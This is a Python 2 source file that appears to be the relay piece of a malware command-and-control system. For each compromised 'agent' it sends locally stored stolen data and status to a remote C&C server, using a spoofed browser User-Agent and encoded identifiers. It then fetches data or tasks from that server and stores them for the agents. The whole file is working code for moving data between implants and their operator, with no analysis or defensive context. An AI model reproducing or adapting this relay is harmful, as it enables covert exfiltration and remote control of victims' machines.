########################################################################

if not __name__ == '__main__':
    exit()

########################################################################

import sys, os
import urllib2
import struct
import time
#
from settings import SERVER_UID, \
    P2_Scheme, \
    P3_Scheme, \
    LocalStorage, \
    W3Logger, \
    XAS_IP, XAS_GATE, \
    LS_TIMEOUT, \
    FILES_PER_ITER

os.umask(0000)

def sendHTTPRequest(url, data):
    resp = None
    try:
        request = urllib2.Request(url, data)
        request.add_header('User-Agent', 'Mozilla/4.0')
        response = urllib2.urlopen(request)
        resp = response.read()
    except urllib2.HTTPError,e:
        W3Logger.log_error( "sendHTTPRequest HTTPError: %d" % e.code )
    except urllib2.URLError,e:
        W3Logger.log_error( "sendHTTPRequest URLError: %s" % str(e) )
    except:
        W3Logger.log_exception( "sendHTTPRequest Unhandled exception!" )
        raise
    return resp

########################################################################

BASE_URL = "http://" + XAS_IP + XAS_GATE

def url_for_agent(agent_id):
    url =  BASE_URL + "?s=" + P3_Scheme.pack_service_data(struct.pack("<I", SERVER_UID)) +\
           "&a=" + P3_Scheme.pack_data(struct.pack("<I", agent_id))
    return url

def send_last_activity_info(agent_id):
    try:
        data = LocalStorage.get_status_info_for_agent(agent_id)
        if not data:
            return
        W3Logger.log_message( "Try to Send Activity info" )
        data = "t=1&d=" + data
        resp = sendHTTPRequest(url_for_agent(agent_id), data)
        if not resp or resp != '200':
            W3Logger.log_error("Status send error!")
        else:
            W3Logger.log_message(">> Status sended")
    except:
        W3Logger.log_exception("send_last_activity_info" )
        t = sys.exc_info()[0]
        if t == KeyboardInterrupt:
            raise

def send_data_to_cc_from(agent_id):
    try:
        mark, data = LocalStorage.get_data_from_agent(agent_id)
        if not data:
            return
        meta, data = data.split(P3_Scheme.separator)
        W3Logger.log_message( "> Try to Send data" + str(mark) )
        data = "t=2" + "&m=" + meta + "&d=" + data
        resp = sendHTTPRequest(url_for_agent(agent_id), data)
        if resp and resp == '200':
            W3Logger.log_message( ">> Data Sended" )
        else:
            W3Logger.log_message( ">> Not sended!" )
        LocalStorage.data_from_agent_accepted(agent_id, mark)
    except:
        W3Logger.log_exception( "send_data_to_cc_from" )
        t = sys.exc_info()[0]
        if t == KeyboardInterrupt:
            raise

def get_data_from_cc_to(agent_id):
    try:
        W3Logger.log_message("> Try to Get data")
        data = sendHTTPRequest(url_for_agent(agent_id), None)
        if data and data != '404':
            W3Logger.log_message('>> Data received ' + str(len(data)))
            data = P3_Scheme.unpack_agent_data(data)

            # data = P2_Scheme.pack_agent_data(P3_Scheme.unpack_agent_data(data))
            #data = base64.b64encode(data)
            #data = P3_Scheme.unpack_agent_data(data)
            LocalStorage.save_data_for_agent(agent_id, data)
        else:
            W3Logger.log_message('>> No data!')
    except:
        W3Logger.log_exception("get_data_from_cc_to")
        t = sys.exc_info()[0]
        if t == KeyboardInterrupt:
            raise

def main_loop():
    # Start
    # Get agents dirs list
    agents_list = LocalStorage.get_agents_list()
    for agent_id in agents_list:
        W3Logger.log_message("\n>> " + str(agent_id))
        send_last_activity_info(agent_id)
        for i in range(FILES_PER_ITER):
            send_data_to_cc_from(agent_id)
            get_data_from_cc_to(agent_id)
        time.sleep(0.3)

if __name__ == '__main__':
    while 1:
        try:
            main_loop()
            W3Logger.log_message("\n########################################################################")
            # Wait and run next cycle
            time.sleep(LS_TIMEOUT)
            # break
        except:
            W3Logger.log_exception("root EXC")
            t = sys.exc_info()[0]
            if t == KeyboardInterrupt:
                exit()
            else:
                continue
